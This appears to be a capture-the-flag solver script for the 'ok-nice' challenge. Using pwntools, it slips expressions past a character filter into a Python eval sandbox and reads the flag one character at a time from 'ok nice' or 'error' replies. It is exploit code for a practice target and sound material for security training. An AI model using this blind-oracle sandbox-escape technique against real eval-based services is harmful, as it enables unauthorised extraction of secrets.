from pwn import *

# ()*+,-/:;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]^`abcdefghijklmnopqrsuvwxyz|

# Side channel attack

io = remote("ok-nice.chal.imaginaryctf.org", 1337)

one_str = "True*True"

def gen_num(num):
    if num == 0:
        return f"{one_str}-{one_str}"
    
    out = one_str
    for _ in range(num-1):
        out += f"+{one_str}"
    
    return out

flag = ""

for i in range(0, 32):
    for j in range(48, 128):
        print(i, j)
        out = f"[flag][ord(flag[{gen_num(i)}])-({gen_num(j)})]"
        io.sendlineafter(b"Enter input: ", out)

        res = io.recvuntil([b"ok nice", b"error"])

        if b"ok nice" in res:
            flag += chr(j)
            print(flag)
            break